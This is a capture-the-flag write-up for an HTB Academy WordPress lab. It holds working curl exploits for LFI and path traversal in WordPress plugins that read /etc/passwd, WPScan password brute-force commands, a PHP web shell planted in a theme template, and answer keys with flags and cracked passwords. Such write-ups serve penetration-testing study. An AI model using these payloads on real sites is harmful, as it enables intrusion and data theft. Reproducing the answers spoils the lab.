# HTB Academy Write-up: Hacking WordPress

## Overview
Practical penetration testing of WordPress installations covering enumeration, vulnerability assessment, and exploitation techniques.

## WordPress Structure

### Default WordPress File Structure
WordPress requires a fully installed and configured LAMP stack before installation. After installation, all WordPress supporting files and directories are accessible in the webroot at `/var/www/html`.

### File Structure
```bash
tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

### Key WordPress Files
- `index.php` - The homepage of WordPress
- `license.txt` - Contains version information
- `wp-activate.php` - Used for email activation process
- `wp-admin` - Contains login page and backend dashboard

### WordPress Configuration File
The `wp-config.php` file contains database connection information and authentication keys.

### Key WordPress Directories
```bash
tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
```

### WordPress User Roles
| Role | Description |
|------|-------------|
| Administrator | Full access to administrative features |
| Editor | Can publish and manage posts |
| Author | Can publish and manage own posts |
| Contributor | Can write but not publish posts |
| Subscriber | Basic browsing and profile editing |

## Exercises

### Target: 94.237.51.6:59835

#### Q1: Directory Enumeration and Flag Retrieval
**Objective:** Manually enumerate directories with listing enabled and locate flag.txt

```bash
curl -s http://94.237.51.6:59835/wp-content/plugins/mail-masta/
```

**Browser Access:**
```
http://94.237.51.6:59835/wp-content/plugins/mail-masta/
```

Navigate to `/inc` directory and open `flag.txt`

**Answer:** `HTB{3num3r4t10n_15_k3y}`

#### Q2: User Enumeration
**Objective:** Identify username for User ID 2

**Method:** Review posts to uncover user IDs and corresponding usernames

**Answer:** `ch4p`

#### Q3: XML-RPC Method Enumeration
**Objective:** Discover available XML-RPC method calls

```bash
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
  http://94.237.51.6:59835/xmlrpc.php | grep value > rpc.txt
```

**Answer:** `80`

#### Q4: WPScan Plugin Enumeration
**Objective:** Find vulnerable plugin version

```bash
wpscan --url http://94.237.51.6:59835 --plugins-detection aggressive -e vp --api-token YOUR_API_TOKEN
```

**Plugin Verification:**
```
http://94.237.51.6:59835/wp-content/plugins/photo-gallery/readme.txt
```

**Answer:** `1.5.34`

#### Q5: LFI Vulnerability Exploitation
**Objective:** Read /etc/passwd via LFI vulnerability

```bash
curl -s "http://94.237.51.6:59835/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

**Answer:** `sally.jones`

#### Q6: WordPress User Bruteforce
**Objective:** Brute force password for user "roger"

```bash
wpscan --password-attack xmlrpc -U roger -P /usr/share/wordlists/rockyou.txt --url http://94.237.51.6:59835
```

**Answer:** `lizard`

#### Q7: RCE via Theme Editor
**Objective:** Gain shell access and retrieve flag

**Login Credentials:**
- URL: `http://94.237.51.6:59835/wp-admin`
- Username: `admin`
- Password: `sunshine1`

**Web Shell Implementation:**
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Flag Retrieval:**
```
http://94.237.51.6:59835/wp-content/themes/twentysixteen/404.php?cmd=cat+/home/wp-user/flag.txt
```

**Answer:** `HTB{rc3_By_d3s1gn}`

## Skills Assessment - WordPress

### Target: 10.129.254.181 (ACADEMY-MISC-NIX01)

#### Preparation
```bash
echo "10.129.207.105 blog.inlanefreight.local" | sudo tee -a /etc/hosts
echo "10.129.207.105 inlanefreight.local" | sudo tee -a /etc/hosts
```

#### Q1: WordPress Version Identification
```bash
wpscan --url http://blog.inlanefreight.local --enumerate t
```

**Answer:** `5.1.6`

#### Q2: Active Theme Identification
**Answer:** `twentynineteen`

#### Q3: Directory Listing Flag
**Answer:** `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}`

#### Q4: Non-admin User Enumeration
```bash
wpscan --url http://blog.inlanefreight.local --enumerate u
```

**Answer:** `Charlie Wiggins`

#### Q5: Unauthenticated File Download
**Vulnerable Plugin:** Email Subscribers v4.2.2

```bash
curl "http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/download.php?file=../../../../flag.txt"
```

**Answer:** `HTB{unauTh_d0wn10ad!}`

#### Q6: LFI Vulnerable Plugin Version
**Answer:** `1.1.1`

#### Q7: System User Discovery via LFI
```bash
curl -s "http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../../../../../../../../../../../etc/passwd"
```

**Answer:** `frank.mclane`

#### Q8: Full System Compromise
**Attack Chain:**
1. Password brute force: `erika:010203`
2. WordPress admin access
3. PHP web shell deployment in 404.php template
4. Reverse shell establishment
5. Flag retrieval from `/home/erika`

**Answer:** `HTB{w0rdPr355_4SS3ssm3n7}`
```
